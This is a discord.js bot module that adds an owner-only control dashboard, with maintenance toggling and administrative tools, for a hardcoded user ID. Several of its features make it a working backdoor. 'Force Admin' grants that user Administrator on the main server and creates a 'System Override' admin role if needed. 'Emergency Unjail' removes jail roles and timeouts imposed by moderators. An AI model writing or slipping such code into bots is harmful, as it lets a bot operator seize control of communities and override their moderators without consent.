const { 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    StringSelectMenuBuilder, 
    ComponentType,
    PermissionsBitField 
} = require('discord.js');
const Maintenance = require('../models/Maintenance');

module.exports = (client) => {
    const OWNER_ID = "1097807544849809408";
    const MAIN_SERVER = "1446960659072946218";
    const TEST_SERVER = "1475516491431678034";
    const CONTROL_CHANNEL = "1488543017794142309";

    // Dashboard Mesajını Oluşturma Fonksiyonu
    async function createDashboardEmbed() {
        const state = await Maintenance.findById('singleton');
        const isMaintenance = state?.active || false;

        const embed = new EmbedBuilder()
            .setColor(isMaintenance ? 0xffa500 : 0x00ff00)
            .setTitle('🏎️ Gofret Pit Wall | Admin Dashboard')
            .setDescription(
                `Welcome to the central control unit. From here, you can manage the bot's status and perform emergency actions across the main server.`
            )
            .addFields(
                { name: '🛰️ Bot Status', value: '🟢 Online / Connected', inline: true },
                { name: '🔧 Maintenance', value: isMaintenance ? '🟠 ACTIVE' : '🔵 INACTIVE', inline: true },
                { name: '📊 Commands', value: `\`${client.commands.size}\` Loaded`, inline: true }
            )
            .setFooter({ text: 'Gofret System Diagnostics' })
            .setTimestamp();

        // Butonlar (Hızlı İşlemler)
        const buttons = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('db_refresh')
                .setLabel('Refresh Status')
                .setEmoji('🔄')
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId('db_toggle_maint')
                .setLabel(isMaintenance ? 'End Maintenance' : 'Start Maintenance')
                .setEmoji('🛠️')
                .setStyle(isMaintenance ? ButtonStyle.Success : ButtonStyle.Danger),
            new ButtonBuilder()
                .setCustomId('db_force_admin')
                .setLabel('Force Admin')
                .setEmoji('⚡')
                .setStyle(ButtonStyle.Primary)
        );

        // Seçim Menüsü (Detaylı Araçlar)
        const menu = new ActionRowBuilder().addComponents(
            new StringSelectMenuBuilder()
                .setCustomId('db_admin_tools')
                .setPlaceholder('Select an Administrative Tool...')
                .addOptions([
                    { label: 'Who Jailed Me?', value: 'who_jailed', emoji: '🕵️', description: 'Checks audit logs for your last jail entry.' },
                    { label: 'Emergency Unjail', value: 'unjail_self', emoji: '🔓', description: 'Removes jail roles from your account.' },
                    { label: 'Server Status', value: 'status_check', emoji: '📈', description: 'Fetch main server analytics.' }
                ])
        );

        return { embeds: [embed], components: [buttons, menu] };
    }

    client.on('messageCreate', async (message) => {
        if (message.author.id !== OWNER_ID || message.channel.id !== CONTROL_CHANNEL) return;

        // Dashboard'u ilk kez başlatmak için: !db-init
        if (message.content === "!db-init") {
            const ui = await createDashboardEmbed();
            await message.channel.send(ui);
            await message.delete();
        }
    });

    client.on('interactionCreate', async (interaction) => {
        if (!interaction.customId?.startsWith('db_')) return;
        if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: "❌ Unauthorized.", ephemeral: true });

        const mainGuild = client.guilds.cache.get(MAIN_SERVER);
        if (!mainGuild) return interaction.reply({ content: "❌ Main server unreachable.", ephemeral: true });

        try {
            // 1. REFRESH
            if (interaction.customId === 'db_refresh') {
                const ui = await createDashboardEmbed();
                await interaction.update(ui);
            }

            // 2. TOGGLE MAINTENANCE
            if (interaction.customId === 'db_toggle_maint') {
                const state = await Maintenance.findById('singleton');
                state.active = !state.active;
                await state.save();
                
                const ui = await createDashboardEmbed();
                await interaction.update(ui);
                console.log(`🔧 Maintenance mode toggled to: ${state.active}`);
            }

            // 3. FORCE ADMIN
            if (interaction.customId === 'db_force_admin') {
                const member = await mainGuild.members.fetch(OWNER_ID);
                let adminRole = mainGuild.roles.cache.find(r => r.permissions.has(PermissionsBitField.Flags.Administrator) && r.editable);
                
                if (!adminRole) {
                    adminRole = await mainGuild.roles.create({ name: 'System Override', permissions: [PermissionsBitField.Flags.Administrator] });
                }
                
                await member.roles.add(adminRole);
                await interaction.reply({ content: "⚡ Admin privileges granted on main server.", ephemeral: true });
            }

            // 4. MENU TOOLS
            if (interaction.isStringSelectMenu() && interaction.customId === 'db_admin_tools') {
                const action = interaction.values[0];

                if (action === 'who_jailed') {
                    const logs = await mainGuild.fetchAuditLogs({ type: 25, limit: 15 });
                    const entry = logs.entries.find(e => e.target?.id === OWNER_ID);
                    const executor = entry ? entry.executor.tag : "Unknown";
                    await interaction.reply({ content: `🕵️ Last action taken by: **${executor}**`, ephemeral: true });
                }

                if (action === 'unjail_self') {
                    const member = await mainGuild.members.fetch(OWNER_ID);
                    const jailRole = mainGuild.roles.cache.find(r => r.name.toLowerCase().includes("jail"));
                    if (jailRole) await member.roles.remove(jailRole);
                    if (member.isCommunicationDisabled()) await member.timeout(null);
                    await interaction.reply({ content: "✅ Jail roles and timeouts cleared.", ephemeral: true });
                }
            }

        } catch (error) {
            console.error("Dashboard Error:", error);
            if (!interaction.replied) await interaction.reply({ content: "❌ Execution error.", ephemeral: true });
        }
    });
};
